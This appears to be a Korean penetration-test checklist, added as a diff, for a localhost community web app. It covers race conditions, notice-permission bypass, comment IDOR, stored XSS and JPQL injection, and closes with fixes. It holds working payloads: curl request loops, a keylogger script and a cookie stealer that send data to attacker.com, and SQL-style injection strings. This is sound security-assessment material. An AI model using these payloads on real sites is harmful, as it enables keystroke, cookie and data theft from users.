@@ -1,0 +1,177 @@
+================================================================================
+[VCE-CM-27] 취약점 진단 항목에 정의되지 않은 취약점 (커뮤니티 특화)
+도메인: community
+================================================================================
+
+1. 진단 항목 개요
+   - 항목명: 미정의 취약점 — 좋아요 Race Condition, 공지사항 권한 우회,
+             댓글 IDOR, Stored XSS 키로거, JPQL 인젝션 심화
+   - 번호: CM-27
+   - 위험도: Critical/High (복합)
+
+2. 대상 기능 & 엔드포인트
+   - POST /api/community/posts/{id}/like     — 좋아요 Race Condition
+   - POST /api/community/posts               — 공지사항 권한 우회 (isNotice=true)
+   - DELETE /api/community/comments/{id}     — 댓글 IDOR
+   - POST /api/community/posts               — Stored XSS 키로거
+   - GET  /api/community/posts?keyword=      — JPQL 인젝션 심화
+
+3. 취약점 원리 (Why this works)
+
+   [취약점 A] 좋아요 Race Condition
+   좋아요 카운터 증가 로직이 원자적이지 않으면 동시 요청으로 카운터가 비정상적으로 증가한다.
+   또한 한 사용자가 여러 번 좋아요를 누를 수 있는지(중복 방지 로직) 확인.
+
+   [취약점 B] 공지사항 권한 우회
+   일반 사용자가 POST /api/community/posts 요청 시 isNotice:true 파라미터를 추가하면
+   공지사항으로 등록되는지 확인. 서버가 isNotice 필드를 ADMIN만 설정 가능하도록 검증하지
+   않으면 일반 사용자가 공지사항을 게시할 수 있다.
+
+   [취약점 C] 댓글 IDOR
+   DELETE /api/community/comments/{commentId} 에서 commentId 소유자 검증이 없으면
+   타 사용자 댓글을 삭제할 수 있다.
+
+   [취약점 D] Stored XSS 키로거
+   CommunityDetail.tsx:323의 dangerouslySetInnerHTML을 통해
+   키로거 스크립트를 삽입하면 게시글을 보는 모든 사용자의 키 입력이 탈취된다.
+
+   [취약점 E] JPQL 인젝션 심화
+   CommunityService.java:57-64의 keyword 파라미터 직접 연결로
+   모든 게시글(숨김 포함) 조회, 데이터 추출이 가능하다.
+
+4. 테스트 절차 (Step-by-step)
+
+   [취약점 A] 좋아요 Race Condition
+
+   Step 1. 동시 좋아요 요청
+   --- bash 스크립트 ---
+   JWT="<your_jwt>"
+   for i in $(seq 1 20); do
+     curl -s -X POST http://localhost:8080/api/community/posts/1/like \
+       -H "Authorization: Bearer $JWT" &
+   done
+   wait
+   ---
+
+   Step 2. 좋아요 카운터 확인
+   --- HTTP 요청 예시 ---
+   GET /api/community/posts/1 HTTP/1.1
+   Host: localhost:8080
+   ---
+   likeCount가 20 이상이면 Race Condition 확인
+
+   Step 3. 좋아요 취소 후 다시 누르기 무한 반복 (좋아요 수 조작)
+   --- bash 스크립트 ---
+   for i in $(seq 1 100); do
+     curl -s -X POST http://localhost:8080/api/community/posts/1/like \
+       -H "Authorization: Bearer $JWT" -o /dev/null
+   done
+   ---
+
+   ---
+   [취약점 B] 공지사항 권한 우회
+
+   Step 4. isNotice=true 파라미터로 일반 게시글을 공지사항으로 등록
+   --- HTTP 요청 예시 ---
+   POST /api/community/posts HTTP/1.1
+   Host: localhost:8080
+   Authorization: Bearer <USER_JWT>
+   Content-Type: application/json
+
+   {
+     "title": "중요 공지 (가짜)",
+     "content": "이것은 공격자가 작성한 가짜 공지입니다. 긴급 패스워드 변경: https://evil.com",
+     "isNotice": true,
+     "notice": true,
+     "isAdmin": true
+   }
+   ---
+   응답에 isNotice: true 또는 게시글 목록 상단에 표시되면 취약
+
+   ---
+   [취약점 C] 댓글 IDOR
+
+   Step 5. 타 사용자 댓글 삭제
+   --- HTTP 요청 예시 ---
+   DELETE /api/community/comments/999 HTTP/1.1
+   Host: localhost:8080
+   Authorization: Bearer <JWT_A>
+   ---
+   999번 댓글이 JWT_A 소유가 아님에도 삭제 성공 시 취약
+
+   Step 6. 순차 ID 탐색으로 타 사용자 댓글 삭제
+   for id in $(seq 1 50); do
+     result=$(curl -s -o /dev/null -w "%{http_code}" \
+       -X DELETE http://localhost:8080/api/community/comments/$id \
+       -H "Authorization: Bearer $JWT_A")
+     echo "commentId=$id → HTTP $result"
+   done
+
+   ---
+   [취약점 D] Stored XSS 키로거 삽입
+
+   Step 7. 키로거 페이로드로 게시글 작성
+   --- HTTP 요청 예시 ---
+   POST /api/community/posts HTTP/1.1
+   Host: localhost:8080
+   Authorization: Bearer <JWT>
+   Content-Type: application/json
+
+   {
+     "title": "중요 업데이트 안내",
+     "content": "<script>document.addEventListener('keydown',function(e){fetch('https://attacker.com/key?k='+encodeURIComponent(e.key)+document.title)});</script>"
+   }
+   ---
+
+   피해자가 게시글 조회 시 모든 키 입력이 공격자 서버로 전송됨.
+
+   쿠키 탈취 페이로드 (연계):
+   "<script>var i=new Image();i.src='https://attacker.com/c?c='+document.cookie;</script>"
+
+   ---
+   [취약점 E] JPQL 인젝션 심화 (CommunityService.java:57-64 확정)
+
+   Step 8. 전체 게시글 조회 (숨김 포함)
+   URL 인코딩된 페이로드:
+   --- HTTP 요청 예시 ---
+   GET /api/community/posts?keyword=%27+OR+%271%27%3D%271 HTTP/1.1
+   Host: localhost:8080
+   ---
+   디코딩: keyword=' OR '1'='1
+
+   JPQL 쿼리 변환:
+   WHERE (LOWER(p.title) LIKE LOWER('%' OR '1'='1%')
+   → 조건 무효화로 모든 게시글 반환 (숨김 게시글 포함)
+
+   Step 9. 숨김 게시글 전용 조회
+   --- HTTP 요청 예시 ---
+   GET /api/community/posts?keyword=%27+AND+p.isHidden+%3D+%27Y%27+-- HTTP/1.1
+   Host: localhost:8080
+   ---
+   디코딩: keyword=' AND p.isHidden = 'Y' --
+
+   관리자에 의해 숨겨진 게시글만 조회 시도
+
+5. 취약 여부 판단 기준
+   ✅ 취약 (Vulnerable):
+      [A] 동시 좋아요 20개 요청 → likeCount 20 이상
+      [B] isNotice:true 게시글 공지사항으로 등록 성공
+      [C] 타 사용자 댓글 삭제 HTTP 200
+      [D] 게시글 조회 시 키로거 스크립트 실행 (개발자도구 Network에서 attacker.com 요청 확인)
+      [E] JPQL 페이로드로 숨김 게시글 포함 전체 반환
+   ✗ 안전 (Not Vulnerable):
+      각 취약점에 대한 적절한 거부 또는 새니타이징
+
+6. 예상 취약 포인트 (코드 위치)
+   - CommunityLike Entity / CommunityService — 좋아요 중복 방지/원자성 없음 (Race Condition)
+   - CommunityController.java / PostCreateDto — isNotice 필드 ADMIN 검증 없음
+   - CommunityService.java — deleteComment() 소유자 검증 없음 가능성
+   - CommunityDetail.tsx:323 — dangerouslySetInnerHTML={{ __html: post.content }}
+   - CommunityService.java:57-64 — JPQL 문자열 직접 연결
+
+7. 권고 조치
+   [A] 좋아요: 사용자+게시글 Unique 제약 + 원자적 카운터 업데이트 (UPDATE ... WHERE)
+   [B] isNotice: 서버에서 현재 사용자 role == ADMIN인 경우에만 isNotice=true 허용
+   [C] 댓글 삭제: comment.getMember().equals(currentUser) 검증
+   [D] dangerouslySetInnerHTML → DOMPurify.sanitize(post.content) 적용 (최우선)
+   [E] JPQL → Parameterized Query: entityManager.createQuery(jpql).setParameter("kw", "%" + keyword + "%")
